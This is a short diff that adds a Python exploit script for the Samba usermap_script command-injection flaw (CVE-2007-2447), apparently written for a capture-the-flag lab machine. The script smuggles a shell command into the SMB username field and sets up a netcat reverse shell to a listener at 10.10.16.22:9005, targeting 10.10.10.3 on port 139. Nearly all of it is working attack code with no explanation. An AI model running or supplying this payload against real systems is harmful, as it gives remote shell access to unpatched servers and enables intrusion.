@@ -1,0 +1,20 @@
+
+study at : 
+https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py
+
+#!/usr/bin/env python
+
+from smb.SMBConnection import SMBConnection
+shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.22 9005 >/tmp/f"
+
+payload = "/=`nohup sh -c '{}'`".format(shell)
+junk = "A" * 16
+
+conn = SMBConnection(payload, junk, "", "", use_ntlm_v2 = False)
+
+try:
+    conn.connect("10.10.10.3" , 139)
+
+except Exception as e:
+    print e
+
